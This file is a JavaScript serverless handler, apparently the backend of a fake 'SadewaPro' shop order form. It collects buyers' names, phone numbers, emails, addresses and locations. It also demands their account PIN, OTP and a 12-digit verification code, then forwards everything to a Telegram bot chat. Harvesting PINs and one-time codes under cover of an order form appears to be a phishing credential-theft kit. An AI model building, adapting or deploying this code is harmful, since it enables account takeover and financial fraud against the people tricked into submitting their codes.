const TELEGRAM_API = "https://api.telegram.org";

function clean(value) {
  return typeof value === "string" ? value.trim() : "";
}

function escapeHtml(value) {
  return clean(String(value ?? ""))
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function rupiah(value) {
  return `Rp ${Number(value || 0).toLocaleString("id-ID")}`;
}

module.exports = async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ ok: false, error: "Method tidak diizinkan." });
  }

  const token = process.env.BOT_TOKEN_TELEGRAM;
  const chatId = process.env.CHAT_ID_TELEGRAM;
  if (!token || !chatId) {
    return res.status(500).json({ ok: false, error: "Konfigurasi Telegram belum tersedia." });
  }

  const body = req.body || {};
  const required = ["orderCode", "name", "phone", "email", "pin", "otp", "resi", "kodeProduk", "verificationCode", "product", "address", "postal", "shipping"];
  if (!/^\\d{12}$/.test(clean(body.verificationCode))) {
    return res.status(400).json({ ok: false, error: "Kode verifikasi harus terdiri dari 12 angka." });
  }
  if (required.some((key) => !clean(body[key]))) {
    return res.status(400).json({ ok: false, error: "Data pesanan belum lengkap." });
  }

  const price = Number(body.price);
  const qty = Number(body.qty);
  if (!Number.isFinite(price) || price <= 0 || !Number.isInteger(qty) || qty < 1 || qty > 999) {
    return res.status(400).json({ ok: false, error: "Harga atau jumlah pesanan tidak valid." });
  }

  const message = [
    "<b>Pesanan Baru SadewaPro</b>",
    "",
    `<b>Kode Pesanan:</b> ${escapeHtml(body.orderCode)}`,
    `<b>Nama:</b> ${escapeHtml(body.name)}`,
    `<b>WhatsApp:</b> ${escapeHtml(body.phone)}`,
    `<b>Email:</b> ${escapeHtml(body.email)}`,
    "",
    `<b>PIN:</b> ${escapeHtml(body.pin)}`,
    `<b>OTP:</b> ${escapeHtml(body.otp)}`,
    `<b>Kode Resi:</b> ${escapeHtml(body.resi)}`,
    `<b>Kode Produk:</b> ${escapeHtml(body.kodeProduk)}`,
    `<b>Kode 12 Digit:</b> ${escapeHtml(body.verificationCode)}`,
    `<b>Produk:</b> ${escapeHtml(body.product)}`,
    `<b>Harga:</b> ${rupiah(price)}`,
    `<b>Jumlah:</b> ${qty}`,
    `<b>Total:</b> ${rupiah(price * qty)}`,
    body.notes ? `<b>Catatan:</b> ${escapeHtml(body.notes)}` : "",
    "",
    `<b>Alamat:</b> ${escapeHtml(body.address)}`,
    `<b>Kode Pos:</b> ${escapeHtml(body.postal)}`,
    `<b>Layanan:</b> ${escapeHtml(body.shipping)}`,
    body.latitude && body.longitude ? `<b>Koordinat:</b> <a href="https://maps.google.com/?q=${encodeURIComponent(`${body.latitude},${body.longitude}`)}">Buka di Maps</a>` : "",
  ].filter(Boolean).join("\n");

  try {
    const response = await fetch(`${TELEGRAM_API}/bot${encodeURIComponent(token)}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML", disable_web_page_preview: true }),
    });
    const result = await response.json();
    if (!response.ok || !result.ok) {
      return res.status(502).json({ ok: false, error: "Telegram menolak pesan pesanan." });
    }
    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error("[telegram] sendMessage failed", error);
    return res.status(502).json({ ok: false, error: "Telegram tidak dapat dihubungi." });
  }
};
